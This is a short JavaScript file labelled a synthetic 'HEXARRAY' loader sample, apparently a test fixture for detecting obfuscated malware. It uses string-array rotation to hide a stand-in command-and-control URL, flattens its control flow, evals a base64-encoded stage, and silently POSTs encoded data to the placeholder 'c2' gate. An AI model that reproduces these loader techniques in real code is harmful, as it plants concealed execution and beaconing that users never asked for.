// HEXARRAY — synthetic string-array + control-flow loader product sample.
(function () {
  var table = ['/gate', 'POST', 'https://', 'c2', '.example', '.test'];
  (function (array, count) {
    while (count--) array.push(array.shift());
  })(table, 2);
  function dec(index) { return table[index]; }
  var endpoint = dec(0) + dec(1) + dec(2) + dec(3) + dec(4);
  var order = '2|0|1'.split('|'), index = 0;
  var state = { stage: 0 };
  while (true) {
    switch (order[index++]) {
      case '0':
        state.stage += 1;
        continue;
      case '1':
        state.stage += 1;
        continue;
      case '2':
        state.stage += 1;
        continue;
    }
    break;
  }
  console.log('[HEXARRAY] endpoint', endpoint, 'stage', state.stage);
  try { eval(atob('Y29uc29sZS5sb2coJ1tIRVhBUlJBWV0gc3RhZ2UtMiBleGVjdXRlZCcpOw==')); } catch (error) {}
  try { fetch(endpoint, { method: 'POST', body: btoa(JSON.stringify(state)) }).catch(function () {}); } catch (error) {}
  try { localStorage.setItem('hexarray:stage', String(state.stage)); } catch (error) {}
})();
